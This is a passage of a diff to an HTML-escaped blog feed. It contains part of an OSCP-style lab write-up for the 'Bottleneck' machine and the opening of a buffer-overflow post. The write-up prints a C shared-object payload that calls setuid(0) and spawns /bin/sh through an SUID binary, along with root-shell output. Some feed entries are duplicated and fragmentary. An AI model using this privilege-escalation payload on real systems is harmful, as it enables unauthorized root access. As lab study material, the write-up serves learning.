+    &lt;p&gt;I have told you that this is hard machine, since we need to check each code we found, so in that case the code should get arg, one or more then one, and it run dlsym which take the arg and run it with test_this, this is mean we have insert path for &lt;code class=&quot;highlighter-rouge&quot;&gt;so&lt;/code&gt; file that contain function called “test_this” file.
+So, in out case, dlopen is used to open the shared object file “&lt;any_name&gt;.so&quot; with lazy binding (RTLD_LAZY). Then, dlsym is used to obtain the address of the function named &quot;test_this&quot; within the shared object, since that binary is set with suid of 0, this is mean we can binding root shell with that.&lt;/any_name&gt;&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
 #include &amp;lt;sys/types.h&amp;gt;
-#include &lt;unistd.h&gt;
+#include &amp;lt;unistd.h&amp;gt;
 void test_this()
 {
-setuid(0); setgid(0); system(&quot;/bin/sh&quot;);&lt;/unistd.h&gt;&lt;/stdlib.h&gt;&lt;/stdio.h&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-10. Root Escalation: so now, transfer that file to the target and change it's mode to execute, and then run the following to gain shell as root.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;bytevsbyte@bottleneck:/usr/test$ ./testlib /tmp/tmp/test_this.so&lt;/p&gt;
-&lt;h1 id=&quot;id&quot;&gt;id&lt;/h1&gt;
-&lt;p&gt;uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),1000(bytevsbyte),1001(tester)&lt;/p&gt;
-&lt;h1 id=&quot;whoami&quot;&gt;whoami&lt;/h1&gt;
-&lt;p&gt;root
+setuid(0); setgid(0); system(&quot;/bin/sh&quot;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Root Escalation: so now, transfer that file to the target and change it’s mode to execute, and then run the following to gain shell as root.
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bytevsbyte@bottleneck:/usr/test$ ./testlib /tmp/tmp/test_this.so
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),1000(bytevsbyte),1001(tester)
+# whoami
+root
 #
-```&lt;/p&gt;
-
-&lt;h3 id=&quot;bottleneck-1&quot;&gt;Bottleneck&lt;/h3&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
 
 &lt;h3 id=&quot;brokengallery&quot;&gt;BrokenGallery&lt;/h3&gt;
 
@@ -831,7 +824,9 @@ setuid(0); setgid(0); system(&quot;/bin/sh&quot;);&lt;/unistd.h&gt;&lt;/stdlib.h
 
 &lt;h3 id=&quot;dawn3&quot;&gt;Dawn3&lt;/h3&gt;
 
-&lt;h4 id=&quot;final-table-methodology-1&quot;&gt;Final table methodology&lt;/h4&gt;</content><author><name>Guy Zwerdling</name></author><category term="Pentest" /><category term="OSCP" /><summary type="html">Lately, I've been thinking a lot about some job interviews I had recently, especially one at a really good company near me. The interviews were interesting and kind of tough, and they got me thinking about my work...</summary></entry><entry><title type="html">The First Path to Malware Research - Buffer Overflow Analysis.</title><link href="http://localhost:4000/2024/01/07/buffer_overflow_01.html" rel="alternate" type="text/html" title="The First Path to Malware Research - Buffer Overflow Analysis." /><published>2024-01-07T00:00:00+02:00</published><updated>2024-01-07T00:00:00+02:00</updated><id>http://localhost:4000/2024/01/07/buffer_overflow_01</id><content type="html" xml:base="http://localhost:4000/2024/01/07/buffer_overflow_01.html">&lt;p&gt;If you follow up my latest post, you can see that it’s being long time since I upload my latest post here, and you may know that I am working on and preparing to the &lt;strong&gt;OSCP&lt;/strong&gt; exam, which is the ultimate certification in my case. One of the attacks that I have learn on that path and exciting me much, so much so that it gives me chills, is &lt;strong&gt;buffer overflow&lt;/strong&gt; attack. I have seeing many attacks, from the application level to the low level, which is called also the infrastructure level, in my case I have found my self more enjoyable by learning buffer overflow, and after I finish my first attack on that low memory, I finally recognized what I really what to do on the cyber security field is to be cyber security researcher, which mean, among to the others, to know how to analysis malware and viruses, how to track their actions, and understand what they design to do, if you search about that on linkedin, you should find research type of jobs that include reverse engineering.&lt;/p&gt;
+&lt;h4 id=&quot;final-table-methodology-1&quot;&gt;Final table methodology&lt;/h4&gt;
+
+&lt;h2 id=&quot;10-points-box-methodology&quot;&gt;10 points box methodology&lt;/h2&gt;</content><author><name>Guy Zwerdling</name></author><category term="Pentest" /><category term="OSCP" /><summary type="html">Lately, I've been thinking a lot about some job interviews I had recently, especially one at a really good company near me. The interviews were interesting and kind of tough, and they got me thinking about my work...</summary></entry><entry><title type="html">The First Path to Malware Research - Buffer Overflow Analysis.</title><link href="http://localhost:4000/2024/01/07/buffer_overflow_01.html" rel="alternate" type="text/html" title="The First Path to Malware Research - Buffer Overflow Analysis." /><published>2024-01-07T00:00:00+02:00</published><updated>2024-01-07T00:00:00+02:00</updated><id>http://localhost:4000/2024/01/07/buffer_overflow_01</id><content type="html" xml:base="http://localhost:4000/2024/01/07/buffer_overflow_01.html">&lt;p&gt;If you follow up my latest post, you can see that it’s being long time since I upload my latest post here, and you may know that I am working on and preparing to the &lt;strong&gt;OSCP&lt;/strong&gt; exam, which is the ultimate certification in my case. One of the attacks that I have learn on that path and exciting me much, so much so that it gives me chills, is &lt;strong&gt;buffer overflow&lt;/strong&gt; attack. I have seeing many attacks, from the application level to the low level, which is called also the infrastructure level, in my case I have found my self more enjoyable by learning buffer overflow, and after I finish my first attack on that low memory, I finally recognized what I really what to do on the cyber security field is to be cyber security researcher, which mean, among to the others, to know how to analysis malware and viruses, how to track their actions, and understand what they design to do, if you search about that on linkedin, you should find research type of jobs that include reverse engineering.&lt;/p&gt;
 
 &lt;p&gt;If you ask my Mentor, Sagi Kedmi, about that, I am sure that he will be say “you need to be the developer yourself, let the other read you garbage logs”. I can say that I understand that, but after I develop my last two React-Native Apps, I was many time frustrated. On the other hand the path I have done until I have break my first program in low memory level, was so much fun and I learn a lot, so I guess that is better for me to go to that field, the malware researcher and reverse engineer.&lt;/p&gt;
 
